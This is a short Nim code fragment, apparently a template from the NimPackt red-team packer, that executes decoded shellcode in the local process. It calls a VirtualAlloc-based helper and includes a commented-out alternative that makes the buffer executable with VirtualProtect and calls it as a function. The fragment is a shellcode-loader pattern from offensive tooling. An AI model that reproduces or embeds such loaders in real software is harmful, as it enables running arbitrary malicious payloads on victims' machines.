    #[ 
        NimPackt-Template-Shinject.nim starts here
    ]#
    if verbose:
        echo "[*] Executing shellcode in local thread..."

    # Run shellcode using VirtualAlloc(), see base template (same as shellycoat)
    rscva(decodedPay)

    #[
        ALTERNATIVELY, use VirtualAlloc() and execute

            var oldProtect : DWORD
            var ret = VirtualProtect(decodedPay.addr, len(decodedPay), PAGE_EXECUTE_READWRITE, oldProtect.addr)
            doAssert ret != 0, "Error executing VirtualProtect()"
            
            let f = cast[proc(){.nimcall.}](decodedPay.addr)
            f()
    ]#